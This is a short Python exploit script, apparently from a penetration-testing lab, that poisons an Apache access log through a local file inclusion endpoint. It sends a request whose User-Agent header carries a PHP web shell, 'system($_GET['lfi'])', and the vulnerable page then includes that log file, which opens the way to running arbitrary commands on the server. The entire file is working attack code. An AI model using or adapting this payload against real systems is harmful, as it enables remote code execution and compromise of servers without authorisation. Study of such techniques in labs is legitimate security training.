#!/usr/bin/env python3

import requests

s = requests.Session()
url = "http://10.10.195.25:80/lfi/lfi.php?page=/var/log/apache2/access.log"

# inject malicious php code
headers = {'User-Agent': "Mozilla/5.0 <?php system($_GET['lfi']) ?> Firefox/70.0"}

r = s.get(url, headers=headers)
print(r.headers)
print(r.text)
